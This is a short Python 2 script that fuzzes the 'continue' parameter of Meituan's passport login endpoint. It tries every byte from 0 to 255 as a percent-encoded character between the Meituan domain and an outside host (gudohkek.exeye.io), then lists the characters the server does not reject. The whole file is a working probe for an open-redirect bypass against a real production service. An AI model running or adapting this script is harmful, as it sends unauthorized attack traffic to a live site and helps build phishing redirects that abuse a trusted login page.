#coding=utf-8
#by 独立团 -小石
import requests

headers = {
    'User-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0'
}

for fuzz in range(0,256):

        chr_fuzz = chr(fuzz)

        fuzz = hex(fuzz).replace('0x','').zfill(2)

        url = 'https://passport.meituan.com/account/unitivelogin?service=www&continue=http://www.meituan.com%%%s.gudohkek.exeye.io'%(fuzz)

        response = requests.get(url,headers=headers)

        if 'Bad' in response.content:
            pass
        else:
            print '[+] %' + fuzz + '\t' + chr_fuzz
            #print url